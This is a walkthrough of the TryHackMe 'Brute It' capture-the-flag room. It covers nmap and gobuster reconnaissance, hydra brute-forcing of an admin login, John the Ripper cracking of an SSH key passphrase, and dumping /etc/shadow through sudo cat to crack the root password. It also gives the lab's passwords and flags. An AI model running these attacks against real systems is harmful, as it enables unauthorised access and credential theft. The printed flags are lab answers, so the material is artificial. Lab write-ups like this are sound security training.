---
description: Walkthrough (Easy)
---

# Brute It 🟢

[https://tryhackme.com/r/room/bruteit](https://tryhackme.com/r/room/bruteit)

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

### Task 1 : Turn on Machine

***

### Task 2 : Reconnaissance

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption></figcaption></figure>

```bash
nmap -T4 -sVC 10.10.157.189 -oN nmap
```

#### Q) How many ports are open ?

\-> 2

#### Q) What version of SSH is running?

\-> OpenSSH 7.6p1

#### Q)What version of Apache is running?

\-> 2.4.29

#### Q) Which Linux distribution is running?

\-> ubuntu

#### Q) What is the hidden directory?

\-> /admin

Search for hidden directories on web server.

{% code overflow="wrap" %}
```bash
gobuster dir -u http://10.10.157.189 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

***

### Task 3 : Getting a shell

#### Q) What is the user:password of the admin panel?

\-> admin:xavier

<figure><img src="../.gitbook/assets/image (54).png" alt=""><figcaption><p>Found User admin in source</p></figcaption></figure>

{% code overflow="wrap" %}
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.157.189 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=Username or password invalid"
```
{% endcode %}

\-l -> username\
\-P -> password file\
post-form attack\
F -> When to stop attack ( not found this message)

<figure><img src="../.gitbook/assets/image (55).png" alt=""><figcaption><p>Found Password xavier</p></figcaption></figure>

#### Q) What is John's RSA Private Key passphrase?

\-> rockinroll

* **Found that this ssh file is having Encryption. So lets crack it from John the Ripper**

```bash
ssh2john id_rsa > hash 

john hash --wordlist=/usr/share/wordlists/rockyou.txt 

john hash --show 
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption><p>Got rockinroll password lets connect to it</p></figcaption></figure>

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption><p>Connect to john using ssh</p></figcaption></figure>

#### Q ) user.txt

\-> THM{a\_password\_is\_not\_a\_barrier}

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

#### Q ) Web Flag

\-> THM{brut3\_f0rce\_is\_e4sy}

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

***

### Task 4 : Privilege Escalation

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption><p>Found user can Run cat without password as a root</p></figcaption></figure>

#### Q) What is the root's password?

\-> football

#### Method 1:&#x20;

* We can see all the users and passwords of a machine in /etc/shadow&#x20;

```bash
sudo /bin/cat /etc/shadow
```

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption><p>Found password hash of root </p></figcaption></figure>

```bash
john root --wordlist=/usr/share/wordlists/rockyou.txt
```

* Save that hash in root file and crack it using John The ripper

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption><p>Root password is football</p></figcaption></figure>

#### Q) Root.txt

\-> THM{pr1v1l3g3\_3sc4l4t10n}

<figure><img src="../.gitbook/assets/image (49).png" alt=""><figcaption><p>Switch user to root with password</p></figcaption></figure>

#### Method 2 :&#x20;

```bash
sudo /bin/cat /root/root.txt
```

* Using sudo privilege direct display the root flag without login to root.

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
